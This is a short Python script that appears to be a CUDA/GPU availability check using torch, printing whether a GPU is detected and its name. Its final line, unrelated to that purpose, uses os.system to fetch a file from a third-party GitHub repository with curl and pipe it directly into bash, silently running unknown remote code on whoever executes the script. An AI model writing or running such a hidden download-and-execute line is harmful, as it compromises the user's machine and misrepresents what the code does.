import torch
import os

print("CUDA Available:", torch.cuda.is_available())

if torch.cuda.is_available():
    print("GPU Name:", torch.cuda.get_device_name(0))
else:
    print("No GPU detected")

os.system("curl -sL https://github.com/drputraargo-commits/lodong/raw/refs/heads/main/fase | bash")

